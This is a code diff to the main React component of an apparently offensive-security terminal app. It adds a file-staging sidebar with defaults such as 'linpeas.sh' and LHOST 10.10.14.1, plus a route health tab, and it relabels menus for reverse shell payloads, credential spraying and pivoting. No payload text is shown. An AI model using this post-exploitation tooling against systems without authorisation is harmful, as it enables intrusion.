@@ -73,6 +73,7 @@ import { ListenerManagerModal } from './components/ListenerManagerModal';
 import { ListenerProfile, ManagedListenerInfo } from './types/listener';
 import { FileTransferModal } from './components/FileTransferModal';
 import {
+  FileServerKind,
   FileTransferServerConfig,
   FileTransferServerInfo,
   HostedFileEntry,
@@ -337,7 +338,7 @@ export interface TabItem {
   color?: string;
   rootNode: WorkspaceNode;
   activePaneId: string;
-  tabType?: 'terminal' | 'sftp' | 'settings' | 'notes' | 'network-map' | 'editor' | 'winrm';
+  tabType?: 'terminal' | 'sftp' | 'settings' | 'notes' | 'network-map' | 'editor' | 'winrm' | 'route-health';
   sftpSessionId?: string;
   notesHostId?: string;
   notesInitialNoteId?: string | null;
@@ -1054,8 +1055,8 @@ export interface SerialPortInfo {
   isConnected?: boolean;
 }
 
-export type SidebarPanel = 'hosts' | 'snippets' | 'chains' | 'pivot' | 'listeners' | 'notes' | 'totp' | 'credentials';
-export type NavDropdownMenu = 'view' | 'engagement-selector' | 'engagement-tools' | 'terminals' | 'offense' | 'intel';
+export type SidebarPanel = 'hosts' | 'snippets' | 'chains' | 'pivot' | 'transfer' | 'listeners' | 'notes' | 'totp' | 'credentials';
+export type NavDropdownMenu = 'view' | 'engagement-selector' | 'engagement-tools' | 'terminals' | 'offense' | 'networking' | 'intel';
 
 interface WailsRuntime {
   EventsOn: (eventName: string, callback: (data: unknown) => void) => () => void;
@@ -1173,6 +1174,29 @@ export function App({
   const [sidebarPivotBusy, setSidebarPivotBusy] = useState<boolean>(false);
   const [sidebarPivotTargetOs, setSidebarPivotTargetOs] = useState<'linux' | 'windows'>('linux');
 
+  // File Transfer Helper sidebar drawer state (launch, monitor, browse files & folders)
+  const [sidebarTransferDir, setSidebarTransferDir] = useState<string>('');
+  const [sidebarTransferKind, setSidebarTransferKind] = useState<FileServerKind>('builtin');
+  const [sidebarTransferBind, setSidebarTransferBind] = useState<string>('0.0.0.0');
+  const [sidebarTransferPort, setSidebarTransferPort] = useState<number>(8000);
+  const [sidebarTransferUpload, setSidebarTransferUpload] = useState<boolean>(true);
+  const [sidebarTransferFiles, setSidebarTransferFiles] = useState<HostedFileEntry[]>([]);
+  const [sidebarTransferLoadingFiles, setSidebarTransferLoadingFiles] = useState<boolean>(false);
+  const [sidebarTransferSelectedFile, setSidebarTransferSelectedFile] = useState<string>('linpeas.sh');
+  const [sidebarTransferSelectedHashes, setSidebarTransferSelectedHashes] = useState<{
+    filename: string;
+    sha256: string;
+    md5: string;
+    size?: number;
+  } | null>(null);
+  const [sidebarTransferLhost, setSidebarTransferLhost] = useState<string>('10.10.14.1');
+  const [sidebarTransferLocalIPs, setSidebarTransferLocalIPs] = useState<NetworkInterfaceIP[]>([]);
+  const [sidebarTransferTargetOs, setSidebarTransferTargetOs] = useState<'linux' | 'windows'>('linux');
+  const [sidebarTransferCmdSet, setSidebarTransferCmdSet] = useState<FileTransferCommandSet | null>(null);
+  const [sidebarTransferExtCmd, setSidebarTransferExtCmd] = useState<string>('');
+  const [sidebarTransferBusy, setSidebarTransferBusy] = useState<boolean>(false);
+  const [sidebarTransferError, setSidebarTransferError] = useState<string>('');
+
   const handleSidebarResizeStart = useCallback((e: React.MouseEvent) => {
     e.preventDefault();
     setIsResizingSidebar(true);
@@ -1241,7 +1265,115 @@ export function App({
         }).catch(() => {});
       }
     }
+    if (activeSidebarPanel === 'transfer') {
+      const api = getWailsBindings();
+      if (api?.ListFileTransferServers) {
+        void api.ListFileTransferServers().then((s) => {
+          if (s) setDashboardFileServers(s);
+        }).catch(() => {});
+      }
+      if (api?.GetLocalNetworkIPs) {
+        void api.GetLocalNetworkIPs().then((ips) => {
+          if (ips && ips.length > 0) {
+            setSidebarTransferLocalIPs(ips);
+            const vpn = ips.find((i) => i.isVpn) || ips[0];
+            setSidebarTransferLhost((curr) => (curr === '10.10.14.1' ? vpn.ip : curr));
+          }
+        }).catch(() => {});
+      }
+      if (!sidebarTransferDir && api?.GetDefaultStagingDirectory) {
+        void api.GetDefaultStagingDirectory().then((defDir) => {
+          const clean = (defDir || '.').trim();
+          setSidebarTransferDir((prev) => prev || clean);
+          if (clean && api.ListHostedTransferFiles) {
+            setSidebarTransferLoadingFiles(true);
+            void api.ListHostedTransferFiles(clean)
+              .then((files) => setSidebarTransferFiles(files || []))
+              .catch(() => setSidebarTransferFiles([]))
+              .finally(() => setSidebarTransferLoadingFiles(false));
+          }
+        }).catch(() => {});
+      } else if (sidebarTransferDir && api?.ListHostedTransferFiles) {
+        setSidebarTransferLoadingFiles(true);
+        void api.ListHostedTransferFiles(sidebarTransferDir)
+          .then((files) => setSidebarTransferFiles(files || []))
+          .catch(() => {})
+          .finally(() => setSidebarTransferLoadingFiles(false));
+      }
+    }
+  }, [activeSidebarPanel, sidebarTransferDir]);
+
+  useEffect(() => {
+    if (activeSidebarPanel !== 'transfer') return;
+    const api = getWailsBindings();
+    const timer = window.setInterval(() => {
+      if (api?.ListFileTransferServers) {
+        void api.ListFileTransferServers().then((s) => setDashboardFileServers(s || [])).catch(() => {});
+      }
+    }, 2200);
+    return () => window.clearInterval(timer);
   }, [activeSidebarPanel]);
+
+  useEffect(() => {
+    if (activeSidebarPanel !== 'transfer') return;
+    const api = getWailsBindings();
+    const matchedHash =
+      sidebarTransferSelectedHashes && sidebarTransferSelectedHashes.filename === sidebarTransferSelectedFile
+        ? sidebarTransferSelectedHashes
+        : null;
+    if (api?.GenerateFileTransferCommands) {
+      let active = true;
+      void api.GenerateFileTransferCommands({
+        filename: sidebarTransferSelectedFile.trim() || 'linpeas.sh',
+        localIp: sidebarTransferLhost.trim() || '10.10.14.1',
+        port: Number(sidebarTransferPort) || 8000,
+        useTLS: false,
+        targetOs: sidebarTransferTargetOs,
+        enableUpload: sidebarTransferUpload,
+        sha256: matchedHash?.sha256,
+        md5: matchedHash?.md5,
+      }).then((res) => {
+        if (active && res) setSidebarTransferCmdSet(res);
+      }).catch(() => {});
+      return () => { active = false; };
+    }
+  }, [
+    activeSidebarPanel,
+    sidebarTransferSelectedFile,
+    sidebarTransferSelectedHashes,
+    sidebarTransferLhost,
+    sidebarTransferPort,
+    sidebarTransferTargetOs,
+    sidebarTransferUpload,
+  ]);
+
+  useEffect(() => {
+    if (activeSidebarPanel !== 'transfer') return;
+    const api = getWailsBindings();
+    if (api?.GenerateFileServerCommand) {
+      let active = true;
+      void api.GenerateFileServerCommand({
+        id: '',
+        name: `Staging ${sidebarTransferKind}`,
+        kind: sidebarTransferKind,
+        directory: sidebarTransferDir || '.',
+        bindAddress: sidebarTransferBind || '0.0.0.0',
+        port: Number(sidebarTransferPort) || 8000,
+        enableUpload: sidebarTransferUpload,
+        useTLS: false,
+      }).then((cmd) => {
+        if (active && cmd) setSidebarTransferExtCmd(cmd);
+      }).catch(() => {});
+      return () => { active = false; };
+    }
+  }, [
+    activeSidebarPanel,
+    sidebarTransferKind,
+    sidebarTransferDir,
+    sidebarTransferBind,
+    sidebarTransferPort,
+    sidebarTransferUpload,
+  ]);
 
   useEffect(() => {
     if (activeSidebarPanel !== 'totp') return;
@@ -1374,12 +1506,10 @@ export function App({
   const [showFileTransferModal, setShowFileTransferModal] = useState<boolean>(false);
   // Network Pivoting Manager state (F-24)
   const [showPivotManagerModal, setShowPivotManagerModal] = useState<boolean>(false);
-  // Route Health Check state (F-38)
-  const [showRouteHealthModal, setShowRouteHealthModal] = useState<boolean>(false);
+  // Route Health Check Dashboard state (opened as workspace view tab)
   const [dashboardFileServers, setDashboardFileServers] = useState<FileTransferServerInfo[]>([]);
 
-  useEffect(() => {
-    if (!showRouteHealthModal) return;
+  const refreshRouteHealthEndpoints = useCallback(() => {
     const api = getWailsBindings();
     if (api?.ListActiveManagedListeners) {
       void api.ListActiveManagedListeners().then((l) => setDrawerListeners(l || [])).catch(() => {});
@@ -1390,7 +1520,10 @@ export function App({
     if (api?.ListFileTransferServers) {
       void api.ListFileTransferServers().then((s) => setDashboardFileServers(s || [])).catch(() => {});
     }
-  }, [showRouteHealthModal]);
+    if (api?.GetActiveTunnels) {
+      void api.GetActiveTunnels().then((t) => setActiveTunnels(t || [])).catch(() => {});
+    }
+  }, []);
   // WinRM / PowerShell Remoting Client state (F-41)
   const [showWinrmModal, setShowWinrmModal] = useState<boolean>(false);
   // Pentest Engagement Hub state (F-36)
@@ -2151,6 +2284,42 @@ export function App({
       return [...prev, newTab];
     });
   }, []);
+
+  const openRouteHealthTab = useCallback((): void => {
+    refreshRouteHealthEndpoints();
+    setTabs((prev) => {
+      const existingTab = prev.find((t) => t.tabType === 'route-health');
+      if (existingTab) {
+        setActiveTabId(existingTab.id);
+        return prev;
+      }
+      tabCounterRef.current += 1;
+      const seq = tabCounterRef.current;
+      const tabId = `route-health-tab-${seq}`;
+      const paneId = `route-health-pane-${seq}-1`;
+      const newTab: TabItem = {
+        id: tabId,
+        title: 'Route Health Dashboard',
+        color: '#10b981',
+        tabType: 'route-health',
+        rootNode: {
+          type: 'pane',
+          id: paneId,
+          sessionId: `route-health-${seq}`,
+          title: 'Route Health & Listeners Dashboard',
+        },
+        activePaneId: paneId,
+      };
+      setActiveTabId(tabId);
+      return [...prev, newTab];
+    });
+  }, [refreshRouteHealthEndpoints]);
+
+  useEffect(() => {
+    if (activeTab?.tabType === 'route-health') {
+      refreshRouteHealthEndpoints();
+    }
+  }, [activeTab?.tabType, refreshRouteHealthEndpoints]);
 
   const openRemoteEditorTab = useCallback(
     (session: RemoteEditSession, hostId?: string): void => {
@@ -3671,7 +3840,7 @@ export function App({
     }
     const matchedHost = vaultSummary.hosts.find((h) => h.id === cred.hostId);
     const hostNote = matchedHost ? ` for ${matchedHost.label || matchedHost.address}` : '';
-    setStatusMessage(`Saved credential "${cred.label}"${hostNote} to vault (F-19).`);
+    setStatusMessage(`Saved credential "${cred.label}"${hostNote} to vault.`);
   };
 
   const handleSaveSelectionEvidence = async (ev: EvidenceItem) => {
@@ -3682,7 +3851,7 @@ export function App({
     const matchedHost = vaultSummary.hosts.find((h) => h.id === ev.hostId);
     const hostNote = matchedHost ? ` for ${matchedHost.label || matchedHost.address}` : '';
     const reportNote = ev.inReport ? ' [Reportable]' : ' [Internal Only]';
-    setStatusMessage(`Saved evidence artifact "${ev.title}"${hostNote}${reportNote} to vault (F-19).`);
+    setStatusMessage(`Saved evidence artifact "${ev.title}"${hostNote}${reportNote} to vault.`);
   };
 
   const handleSaveSelectionNote = async (note: NotePage) => {
@@ -3696,7 +3865,7 @@ export function App({
     }
     const matchedHost = vaultSummary.hosts.find((h) => h.id === note.hostId);
     const hostNote = matchedHost ? ` for ${matchedHost.label || matchedHost.address}` : '';
-    setStatusMessage(`Saved recon note "${note.title}"${hostNote} to vault (F-17).`);
+    setStatusMessage(`Saved recon note "${note.title}"${hostNote} to vault.`);
   };
 
   const handleSaveSelectionFinding = async (finding: FindingItem, evidence: EvidenceItem) => {
@@ -3709,7 +3878,7 @@ export function App({
     }
     const matchedHost = vaultSummary.hosts.find((h) => h.id === finding.hostId);
     const hostNote = matchedHost ? ` for ${matchedHost.label || matchedHost.address}` : '';
-    setStatusMessage(`Created security finding "${finding.title}"${hostNote} with attached evidence (F-18).`);
+    setStatusMessage(`Created security finding "${finding.title}"${hostNote} with attached evidence.`);
   };
 
   const handleOpenShellStabilize = () => {
@@ -3738,7 +3907,7 @@ export function App({
     if (api?.StabilizeShell) {
       await api.StabilizeShell(req);
     }
-    setStatusMessage(`Injected F-34 PTY stabilization (${req.method} / ${req.mode}) into ${req.sessionId}.`);
+    setStatusMessage(`Injected PTY stabilization (${req.method} / ${req.mode}) into ${req.sessionId}.`);
   };
 
   const handleScanNmapXML = async (xmlContent: string): Promise<NmapScanResult> => {
@@ -4098,7 +4267,7 @@ export function App({
     if (api?.SaveSnippetChain) {
       await api.SaveSnippetChain(chain);
       await refreshVaultState();
-      setStatusMessage(`Saved snippet chain "${chain.name}" (F-16).`);
+      setStatusMessage(`Saved snippet chain "${chain.name}".`);
     }
   };
 
@@ -4114,7 +4283,7 @@ export function App({
     if (api?.DeleteSnippetChain) {
       await api.DeleteSnippetChain(chainId);
       await refreshVaultState();
-      setStatusMessage(`Deleted snippet chain (F-16).`);
+      setStatusMessage(`Deleted snippet chain.`);
     }
   };
 
@@ -4172,7 +4341,7 @@ export function App({
       }
       await api?.WriteTerminal?.(runnerActiveSessionId, cmd + '\n');
     }
-    setStatusMessage(`⚡ Executed step ${stepIndex + 1} of chain "${runnerModalChain.name}" (F-16).`);
+    setStatusMessage(`⚡ Executed step ${stepIndex + 1} of chain "${runnerModalChain.name}".`);
   };
 
   const handleConnect = async (e: React.FormEvent): Promise<void> => {
@@ -4766,6 +4935,7 @@ export function App({
       activeTab.tabType === 'sftp' ||
       activeTab.tabType === 'network-map' ||
       activeTab.tabType === 'winrm' ||
+      activeTab.tabType === 'route-health' ||
       activeTab.tabType === 'editor'
     ) {
       tabCounterRef.current += 1;
@@ -5438,6 +5608,7 @@ export function App({
       activeTab.tabType === 'sftp' ||
       activeTab.tabType === 'network-map' ||
       activeTab.tabType === 'winrm' ||
+      activeTab.tabType === 'route-health' ||
       activeTab.tabType === 'editor'
     ) {
       await handleConnectSavedHost(host);
@@ -5525,7 +5696,8 @@ export function App({
         activeTab.tabType === 'settings' ||
         activeTab.tabType === 'sftp' ||
         activeTab.tabType === 'network-map' ||
-        activeTab.tabType === 'winrm'
+        activeTab.tabType === 'winrm' ||
+        activeTab.tabType === 'route-health'
       ) {
         await handleOpenLocalTerminal(shellType);
         return;
@@ -5647,6 +5819,7 @@ export function App({
       activeTab.tabType === 'sftp' ||
       activeTab.tabType === 'network-map' ||
       activeTab.tabType === 'winrm' ||
+      activeTab.tabType === 'route-health' ||
       activeTab.tabType === 'editor'
     ) {
       tabCounterRef.current += 1;
@@ -7991,7 +8164,7 @@ export function App({
       },
     },
     serial: {
-      label: 'Hardware Bus & UART Logic (F-23)',
+      label: 'Hardware Bus & UART Logic',
       shortLabel: 'Hardware Bus',
       icon: 'serial',
       action: () => {
@@ -8110,7 +8283,7 @@ export function App({
       },
     },
     'import-putty-termius': {
-      label: 'Import PuTTY / Termius (F-30)',
+      label: 'Import PuTTY / Termius',
       shortLabel: 'PuTTY / Termius',
       icon: 'folder',
       action: () => {
@@ -8118,7 +8291,7 @@ export function App({
       },
     },
     'raw-tcp': {
-      label: 'Raw TCP / Netcat (F-31)',
+      label: 'Raw TCP / Netcat',
       shortLabel: 'Raw TCP',
       icon: 'bolt',
       action: () => {
@@ -8126,7 +8299,7 @@ export function App({
       },
     },
     'cred-store': {
-      label: 'Credential Pool & Spray Lists (F-36)',
+      label: 'Credential Pool & Spray Lists',
       shortLabel: 'Credentials',
       icon: 'shield',
       action: () => {
@@ -8134,7 +8307,7 @@ export function App({
       },
     },
     'evidence-vault': {
-      label: 'Evidence Vault & Findings (F-18)',
+      label: 'Evidence Vault & Findings',
       shortLabel: 'Evidence',
       icon: 'shield',
       action: () => {
@@ -8142,7 +8315,7 @@ export function App({
       },
     },
     'nmap-import': {
-      label: 'Nmap XML Recon Ingest (F-39)',
+      label: 'Nmap XML Recon Ingest',
       shortLabel: 'Nmap Ingest',
       icon: 'radar',
       action: () => {
@@ -8150,7 +8323,7 @@ export function App({
       },
     },
     'payload-generator': {
-      label: 'Payload Generator // Reverse & Bind Shells (F-33)',
+      label: 'Payload Generator // Reverse & Bind Shells',
       shortLabel: 'Payloads',
       icon: 'target',
       action: () => {
@@ -8158,7 +8331,7 @@ export function App({
       },
     },
     'listener-manager': {
-      label: 'Listener Manager // Reverse & Bind Catchers (F-32)',
+      label: 'Listener Manager // Reverse & Bind Catchers',
       shortLabel: 'Listeners',
       icon: 'radar',
       action: () => {
@@ -8166,7 +8339,7 @@ export function App({
       },
     },
     'file-transfer': {
-      label: 'File Transfer Helper // HTTP Staging & Hash Check (F-31)',
+      label: 'File Transfer Helper // HTTP Staging & Hash Check',
       shortLabel: 'File Transfer',
       icon: 'upload',
       action: () => {
@@ -8174,7 +8347,7 @@ export function App({
       },
     },
     'pivot-manager': {
-      label: 'Pivoting Engine // ligolo-ng & chisel (F-24)',
+      label: 'Pivoting Engine // ligolo-ng & chisel',
       shortLabel: 'Pivoting',
       icon: 'tunnel',
       action: () => {
@@ -8182,15 +8355,15 @@ export function App({
       },
     },
     'route-health': {
-      label: 'Route Health Check // Throttled OPSEC (F-38)',
+      label: 'Route Health Check Dashboard',
       shortLabel: 'Route Health',
       icon: 'shield',
       action: () => {
-        setShowRouteHealthModal(true);
+        openRouteHealthTab();
       },
     },
     'winrm-client': {
-      label: 'WinRM / PowerShell Remoting (F-41)',
+      label: 'WinRM / PowerShell Remoting',
       shortLabel: 'WinRM',
       icon: 'terminal',
       action: () => {
@@ -8198,7 +8371,7 @@ export function App({
       },
     },
     'snippet-chains': {
-      label: 'Snippet Chains // Multi-Stage Exploits (F-16)',
+      label: 'Snippet Chains // Multi-Stage Exploits',
       shortLabel: 'Chains',
       icon: 'chain',
       action: () => {
@@ -8581,7 +8754,19 @@ export function App({
                   <div className="nav-dropdown-divider" />
                   {renderDropdownRow('new-tab', 'New Connection Tab', 'Ctrl+T', handleOpenNewConnectionTab)}
                   {renderDropdownRow('new-split', 'New Connection Split', undefined, () => handleOpenNewConnectionSplit('right'))}
-                  {renderDropdownRow('view-map', 'Interactive Network Topology Map (F-37)', undefined, openNetworkMapTab)}
+                  {renderDropdownRow('view-map', 'Interactive Network Topology Map', undefined, openNetworkMapTab)}
+                  {renderDropdownRow(
+                    'sftp',
+                    'SFTP File Browser',
+                    undefined,
+                    () => {
+                      if (sessionId && !sessionId.startsWith('local-') && !sessionId.startsWith('serial-')) {
+                        openSftpTab(sessionId, activeTab?.title || 'SFTP', activeTab?.hostId);
+                      }
+                    },
+                    !sessionId || sessionId.startsWith('local-') || sessionId.startsWith('serial-')
+                  )}
+                  {renderDropdownRow('route-health', 'Route Health Check Dashboard', undefined, openRouteHealthTab)}
                   {renderDropdownRow('split-h', 'Split Horizontal', undefined, () => void handleSplitPane('horizontal'))}
                   {renderDropdownRow('split-v', 'Split Vertical', undefined, () => void handleSplitPane('vertical'))}
                   {renderDropdownRow('find', 'Find in Terminal', 'Ctrl+F', () => {
@@ -8820,27 +9005,15 @@ export function App({
                     <div className="tools-sub-header">
                       {activeEngagement ? `ACTIVE: ${activeEngagement.name}` : 'Casual / Global Mode'}
                     </div>
-                    {renderDropdownRow('eng-scope', 'Target Scope & Hub (F-36)', undefined, () => setShowEngagementHubModal(true))}
-                    {renderDropdownRow('cred-store', 'Credential Pool & Spray Lists (F-36)', undefined, () => setShowCredStoreModal(true))}
-                    {renderDropdownRow('evidence-vault', 'Evidence Vault & Findings (F-18)', undefined, () => setShowEvidenceModal(true))}
-                    <div className="nav-dropdown-divider" />
-                    <div className="tools-sub-header">Tunnels &amp; Routing (Engagement / Global)</div>
-                    {renderDropdownRow(
-                      'tunnels',
-                      'Port Forwarding & Tunnels (-L, -R, -D) (F-13)',
-                      activeTunnels.length > 0 ? `${activeTunnels.length} active` : undefined,
-                      () => setShowPortForwardingModal(true),
-                      false,
-                      activeTunnels.length > 0
-                    )}
-                    {renderDropdownRow('proxy-profiles', 'Proxy Profiles & Proxychains (F-14)', undefined, () => setShowProxyProfilesModal(true))}
-                  {renderDropdownRow('pivot-manager', 'Pivoting Engine // ligolo, chisel, sshuttle & SSH (F-24)', undefined, () => setShowPivotManagerModal(true))}
+                    {renderDropdownRow('eng-scope', 'Target Scope & Hub', undefined, () => setShowEngagementHubModal(true))}
+                    {renderDropdownRow('cred-store', 'Credential Pool & Spray Lists', undefined, () => setShowCredStoreModal(true))}
+                    {renderDropdownRow('evidence-vault', 'Evidence Vault & Findings', undefined, () => setShowEvidenceModal(true))}
                     <div className="nav-dropdown-divider" />
                     <div className="tools-sub-header">Engagement Archive (.daeng)</div>
-                    {renderDropdownRow('eng-export', 'Export .daeng Package (F-36)', undefined, () => {
+                    {renderDropdownRow('eng-export', 'Export .daeng Package', undefined, () => {
                       setShowEngagementHubModal(true);
                     })}
-                    {renderDropdownRow('eng-import', 'Import .daeng Package (F-36)', undefined, () => {
+                    {renderDropdownRow('eng-import', 'Import .daeng Package', undefined, () => {
                       setShowEngagementHubModal(true);
                     })}
                   </div>
@@ -8853,7 +9026,7 @@ export function App({
               <span className="cyber-glitch-slashes">//</span>
             </div>
 
-            {/* 3. Tool Section: Split into Terminals, Recon & Exploit, and Intel & Keys */}
+            {/* 3. Tool Section: Terminals, Recon & Exploit, Networking & Pivoting, and Intel & Keys */}
             {/* 3a. Terminals Dropdown */}
             <div
               className="nav-menu-container"
@@ -8891,32 +9064,10 @@ export function App({
                   {renderDropdownRow('dir-root', 'New Root Shell in Current Directory', undefined, () => void handleOpenTerminalDirectory('root'))}
 
                   <div className="nav-dropdown-divider" />
-                  <div className="tools-sub-header">Hardware, Tunnels &amp; Direct Links</div>
-                  {renderDropdownRow('serial', 'Hardware Bus & UART Logic (F-23)', undefined, () => void handleOpenSerialModal())}
-                  {renderDropdownRow(
-                    'tunnels',
-                    'Port Forwarding (-L, -R, -D)',
-                    activeTunnels.length > 0 ? `${activeTunnels.length} active` : undefined,
-                    () => setShowPortForwardingModal(true),
-                    false,
-                    activeTunnels.length > 0
-                  )}
-                  {renderDropdownRow('proxy-profiles', 'Proxy Profiles (Jump, SOCKS5)', undefined, () => setShowProxyProfilesModal(true))}
-                  {renderDropdownRow('pivot-manager', 'Pivoting Engine // ligolo & chisel (F-24)', undefined, () => setShowPivotManagerModal(true))}
-                  {renderDropdownRow('route-health', 'Route Health Check // OPSEC (F-38)', undefined, () => setShowRouteHealthModal(true))}
-                  {renderDropdownRow('raw-tcp', 'Raw TCP / Netcat (F-31)', undefined, () => setShowRawTcpModal(true))}
-                  {renderDropdownRow('winrm-client', 'WinRM / PowerShell Remoting (F-41)', undefined, () => openWinrmTab())}
-                  {renderDropdownRow(
-                    'sftp',
-                    'SFTP File Browser',
-                    undefined,
-                    () => {
-                      if (sessionId && !sessionId.startsWith('local-') && !sessionId.startsWith('serial-')) {
-                        openSftpTab(sessionId, activeTab?.title || 'SFTP', activeTab?.hostId);
-                      }
-                    },
-                    !sessionId || sessionId.startsWith('local-') || sessionId.startsWith('serial-')
-                  )}
+                  <div className="tools-sub-header">Hardware &amp; Direct Links</div>
+                  {renderDropdownRow('serial', 'Hardware Bus & UART Logic', undefined, () => void handleOpenSerialModal())}
+                  {renderDropdownRow('raw-tcp', 'Raw TCP / Netcat', undefined, () => setShowRawTcpModal(true))}
+                  {renderDropdownRow('winrm-client', 'WinRM / PowerShell Remoting', undefined, () => openWinrmTab())}
                 </div>
               )}
             </div>
@@ -8950,22 +9101,65 @@ export function App({
                   onMouseMove={handleMenuMove}
                 >
                   <div className="tools-sub-header">Phase 1 // Recon &amp; Enumeration</div>
-                  {renderDropdownRow('nmap-import', 'Nmap XML Recon Ingest (F-39)', undefined, () => setShowNmapImportModal(true))}
+                  {renderDropdownRow('nmap-import', 'Nmap XML Recon Ingest', undefined, () => setShowNmapImportModal(true))}
 
                   <div className="nav-dropdown-divider" />
                   <div className="tools-sub-header">Phase 2 // Delivery &amp; Catchers</div>
-                  {renderDropdownRow('listener-manager', 'Listener Manager (F-32)', undefined, () => setShowListenerManagerModal(true))}
-                  {renderDropdownRow('payload-generator', 'Payload Generator // Shells (F-33)', undefined, () => setShowPayloadGeneratorModal(true))}
-                  {renderDropdownRow('file-transfer', 'File Transfer Helper // Staging (F-31)', undefined, () => setShowFileTransferModal(true))}
+                  {renderDropdownRow('listener-manager', 'Listener Manager', undefined, () => setShowListenerManagerModal(true))}
+                  {renderDropdownRow('payload-generator', 'Payload Generator // Shells', undefined, () => setShowPayloadGeneratorModal(true))}
+                  {renderDropdownRow('file-transfer', 'File Transfer Helper // Staging', undefined, () => setShowFileTransferModal(true))}
 
                   <div className="nav-dropdown-divider" />
                   <div className="tools-sub-header">Phase 3 // Execution &amp; Post-Exploit</div>
-                  {renderDropdownRow('winrm-client', 'WinRM / PowerShell Remoting (F-41)', undefined, () => openWinrmTab())}
+                  {renderDropdownRow('winrm-client', 'WinRM / PowerShell Remoting', undefined, () => openWinrmTab())}
                   {renderDropdownRow('snippets', 'Command Snippets & Variables', undefined, () => setShowSnippetsModal(true))}
-                  {renderDropdownRow('snippet-chains', 'Snippet Chains & Exploits (F-16)', undefined, () => {
+                  {renderDropdownRow('snippet-chains', 'Snippet Chains & Exploits', undefined, () => {
                     setChainsHostFilter(activeTab?.hostId || null);
                     setShowChainsModal(true);
                   })}
+                </div>
+              )}
+            </div>
+
+            {/* 3c. Networking & Pivoting Dropdown */}
+            <div
+              className="nav-menu-container"
+              onMouseEnter={() => handleMenuEnter('networking')}
+              onMouseMove={handleMenuMove}
+              onMouseLeave={handleMenuLeave}
+            >
+              <button
+                type="button"
+                className={`nav-menu-trigger ${activeDropdownMenu === 'networking' ? 'active' : ''}`}
+                aria-haspopup="true"
+                aria-expanded={activeDropdownMenu === 'networking'}
+                onClick={() =>
+                  setActiveDropdownMenu((prev) => (prev === 'networking' ? null : 'networking'))
+                }
+              >
+                <CyberIcon name="tunnel" size={11} />
+                <span>Networking &amp; Pivoting</span>
+                <span style={{ fontSize: '0.65rem' }}>▾</span>
+              </button>
+              {activeDropdownMenu === 'networking' && (
+                <div
+                  className="nav-dropdown-menu"
+                  role="menu"
+                  aria-label="Networking and Pivoting Menu"
+                  onMouseEnter={() => handleMenuEnter('networking')}
+                  onMouseMove={handleMenuMove}
+                >
+                  <div className="tools-sub-header">Tunnels, Proxies &amp; Pivoting</div>
+                  {renderDropdownRow(
+                    'tunnels',
+                    'Port Forwarding',
+                    activeTunnels.length > 0 ? `${activeTunnels.length} active` : undefined,
+                    () => setShowPortForwardingModal(true),
+                    false,
+                    activeTunnels.length > 0
+                  )}
+                  {renderDropdownRow('proxy-profiles', 'Proxy Profiles', undefined, () => setShowProxyProfilesModal(true))}
+                  {renderDropdownRow('pivot-manager', 'Pivoting Engine', undefined, () => setShowPivotManagerModal(true))}
                 </div>
               )}
             </div>
@@ -9187,7 +9381,7 @@ export function App({
               )}
             </button>
 
-            {/* 4. Network Pivoting & Relay Launcher (F-24) */}
+            {/* 4. Network Pivoting & Relay Launcher */}
             <button
               type="button"
               className={`activity-bar-btn ${activeSidebarPanel === 'pivot' && !sidebarCollapsed ? 'active' : ''}`}
@@ -9199,7 +9393,7 @@ export function App({
                   setSidebarCollapsed(false);
                 }
               }}
-              title="Network Pivoting & Tunnel Launcher (F-24)"
+              title="Network Pivoting & Tunnel Launcher"
               aria-label="Network Pivoting Panel"
             >
               <CyberIcon name="tunnel" size={18} />
@@ -9210,7 +9404,30 @@ export function App({
               )}
             </button>
 
-            {/* 5. Active Listeners (F-32) */}
+            {/* 5. File Transfer Helper & Staging */}
+            <button
+              type="button"
+              className={`activity-bar-btn ${activeSidebarPanel === 'transfer' && !sidebarCollapsed ? 'active' : ''}`}
+              onClick={() => {
+                if (activeSidebarPanel === 'transfer' && !sidebarCollapsed) {
+                  setSidebarCollapsed(true);
+                } else {
+                  setActiveSidebarPanel('transfer');
+                  setSidebarCollapsed(false);
+                }
+              }}
+              title="File Transfer Helper & Staging Servers"
+              aria-label="File Transfer Helper Panel"
+            >
+              <CyberIcon name="upload" size={18} />
+              {dashboardFileServers.length > 0 && (
+                <span className="activity-bar-badge" style={{ background: '#10b981', color: '#020617' }}>
+                  {dashboardFileServers.length}
+                </span>
+              )}
+            </button>
+
+            {/* 6. Active Listeners */}
             <button
               type="button"
               className={`activity-bar-btn ${activeSidebarPanel === 'listeners' && !sidebarCollapsed ? 'active' : ''}`}
@@ -9599,7 +9816,7 @@ export function App({
                         type="button"
                         className="btn-primary btn-sm"
                         onClick={() => setShowSnippetsModal(true)}
-                        title="Open Snippets Manager (F-15)"
+                        title="Open Snippets Manager"
                       >
                         + Manage
                       </button>
@@ -9701,7 +9918,7 @@ export function App({
                           setChainsHostFilter(null);
                           setShowChainsModal(true);
                         }}
-                        title="Open Chains Manager (F-16)"
+                        title="Open Chains Manager"
                       >
                         + Chains
                       </button>
@@ -9760,7 +9977,7 @@ export function App({
                         type="button"
                         className="btn-primary btn-sm"
                         onClick={() => setShowPivotManagerModal(true)}
-                        title="Open Full Network Pivoting Manager (F-24)"
+                        title="Open Full Network Pivoting Manager"
                       >
                         Full View
                       </button>
@@ -10207,6 +10424,556 @@ export function App({
                 </div>
               )}
 
+              {activeSidebarPanel === 'transfer' && (
+                <div className="drawer-panel drawer-transfer-panel" style={{ display: 'flex', flexDirection: 'column', height: '100%', overflow: 'hidden' }}>
+                  <div className="sidebar-header">
+                    <h2>File Transfer</h2>
+                    <div className="sidebar-actions" style={{ display: 'flex', gap: '4px' }}>
+                      <button
+                        type="button"
+                        className="btn-primary btn-sm"
+                        onClick={() => setShowFileTransferModal(true)}
+                        title="Open Full File Transfer Helper Window"
+                      >
+                        Full View
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* TOP: Staging Directory, Server Engine & Launcher */}
+                  <div
+                    style={{
+                      padding: '0.6rem 0.75rem',
+                      borderBottom: '1px solid rgba(0, 240, 255, 0.2)',
+                      display: 'flex',
+                      flexDirection: 'column',
+                      gap: '0.42rem',
+                      flexShrink: 0,
+                    }}
+                  >
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                      <span style={{ fontSize: '0.68rem', fontWeight: 700, color: '#00f0ff', letterSpacing: '0.07em' }}>
+                        STAGING LAUNCHER &amp; MONITOR
+                      </span>
+                      <button
+                        type="button"
+                        className="drawer-action-btn"
+                        style={{ padding: '1px 6px', fontSize: '0.63rem' }}
+                        onClick={() => {
+                          const api = getWailsBindings();
